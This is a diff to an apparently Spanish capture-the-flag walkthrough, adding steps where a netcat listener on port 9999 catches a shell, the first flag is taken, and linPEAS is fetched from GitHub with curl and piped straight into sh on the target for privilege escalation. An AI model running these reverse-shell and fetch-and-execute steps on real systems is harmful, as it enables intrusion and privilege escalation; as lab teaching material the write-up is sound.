@@ -95,6 +95,32 @@ posteriormente pondremos un netcat a escuchar en el puerto 9999 y nos conectarem
 ````
 nc -lnvp 9999
 ````
+al hacer otra request cualquiera recibiermos esto
+
+![img_21.png](img_21.png)
+
+
+y como podemos observar entramos
+
+![img_22.png](img_22.png)
+
+y con esto obtenemos nuestra primera flag
+![img_23.png](img_23.png)
+![img_24.png](img_24.png)
+![img_25.png](img_25.png)
+
+Ahora tendremos que escalar privilegios para poder obtener la segunda flag.
+Como lo haremos? facil utilizaremos otro script que nos permite escalar privilegios llamado linPEAS (Linux Privilege Escalation Awesome Script).
+https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS
+
+lo ejecutaremos directamente en la maquina con este comando
+````
+curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
+````
+
+![img_26.png](img_26.png)
+
+Este script nos dara mucha informacion util pero nos centraremos en los exploits abiertos o sin corregir que tiene la maquina
 
 
 
